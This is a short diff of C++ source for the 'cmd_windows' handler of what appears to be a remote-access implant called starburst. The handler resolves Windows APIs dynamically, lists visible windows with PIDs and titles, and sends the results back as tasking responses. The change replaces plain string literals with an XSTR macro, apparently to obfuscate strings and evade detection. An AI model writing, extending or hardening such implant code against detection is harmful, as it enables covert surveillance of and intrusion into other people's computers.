@@ -97,7 +97,7 @@ auto declfn starburst::cmd_windows(
     auto h_user32 = inst.kernel32.LoadLibraryA( _n );
     if ( !h_user32 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "failed to load user32.dll" ) ) );
+            XSTR( "failed to load user32.dll" ) );
         return;
     }
 
@@ -116,7 +116,7 @@ auto declfn starburst::cmd_windows(
 
     if ( !pEnumWindows || !pIsWindowVisible || !pGetWindowTextW || !pGetWindowThreadProcessId ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "API resolution failed" ) ) );
+            XSTR( "API resolution failed" ) );
         return;
     }
 
@@ -124,12 +124,12 @@ auto declfn starburst::cmd_windows(
     auto output = static_cast<char*>( inst.heap_alloc( buf_cap ) );
     if ( !output ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+            XSTR( "alloc failed" ) );
         return;
     }
 
     // header
-    str_copy( output, symbol<char*>( const_cast<char*>( "HWND\tPID\tTitle\n" ) ) );
+    str_copy( output, XSTR( "HWND\tPID\tTitle\n" ) );
     uint32_t hdr_len = str_len( output );
 
     WindowEnumCtx ctx = {};
